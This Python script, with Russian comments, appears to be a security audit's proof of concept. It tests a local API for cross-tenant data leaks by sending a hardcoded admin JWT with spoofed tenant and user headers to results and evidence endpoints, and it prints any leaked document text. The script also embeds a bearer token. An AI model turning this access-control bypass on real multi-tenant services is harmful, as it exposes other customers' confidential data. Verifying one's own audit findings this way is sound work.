import httpx
import asyncio
import json

# КОНФИГУРАЦИЯ
BASE_URL = "http://localhost:8000/api/v1" # Проверь порт и префикс
TARGET_RUN_ID = "b544b0fc-02e6-442c-8db9-d49e71c5597d"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmOGY0ZmVkYy02MThkLTRhMTUtYWI2OS0zNDRlZmFlNWVjYmMiLCJ0ZW5hbnRfaWQiOiIxMTExMTExMS0xMTExLTExMTEtMTExMS0xMTExMTExMTExMTEiLCJzeXN0ZW1fcm9sZSI6InRlbmFudF9hZG1pbiIsImVtYWlsIjoiYWRtaW5Ac3RlbG9vbS5jb20iLCJleHAiOjE3ODQyNTI1NzF9._8XRuNmYztmj_I_xTuTDa8TmKm0XVYXRAUropKVnX0Y"

async def check_leak():
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "X-Tenant-Id": "00000000-0000-0000-0000-000000000000", # Фейковый тенант
        "X-User-Id": "00000000-0000-0000-0000-000000000000"    # Фейковый юзер
    }

    print(f"[*] Проверка эндпоинта /results для Run: {TARGET_RUN_ID}")
    
    async with httpx.AsyncClient(timeout=60.0) as client:  # Увеличили до 60 секунд
        # 1. Проверяем список результатов (Находка №16)
        response = await client.get(
            f"{BASE_URL}/results",
            params={"run_id": TARGET_RUN_ID},
            headers=headers
        )

        if response.status_code == 200:
            data = response.json()
            print(f"[!] УСПЕХ (ДЛЯ ХАКЕРА): Получено {len(data)} результатов.")
            
            if len(data) > 0:
                first_res = data[0]
                res_id = first_res.get("id")
                print(f"[!] Пример данных: Check: {first_res.get('check_name')}, Result: {first_res.get('result')}")

                # 2. Проверяем детальный Evidence (Находка №17 — самая опасная)
                print(f"[*] Проверка эндпоинта /results/{res_id}/evidence...")
                ev_resp = await client.get(f"{BASE_URL}/results/{res_id}/evidence", headers=headers)
                
                if ev_resp.status_code == 200:
                    ev_data = ev_resp.json()
                    print(f"[!!!] КРИТИЧЕСКАЯ УТЕЧКА: Доступ к тексту документа получен!")
                    print(f"[!!!] Текст (display_text): {ev_data.get('display_text')[:100]}...")
                else:
                    print(f"[-] Evidence защищен (код {ev_resp.status_code})")
        else:
            print(f"[-] Доступ отклонен (код {response.status_code}). Возможно, токен невалиден.")

if __name__ == "__main__":
    asyncio.run(check_leak())


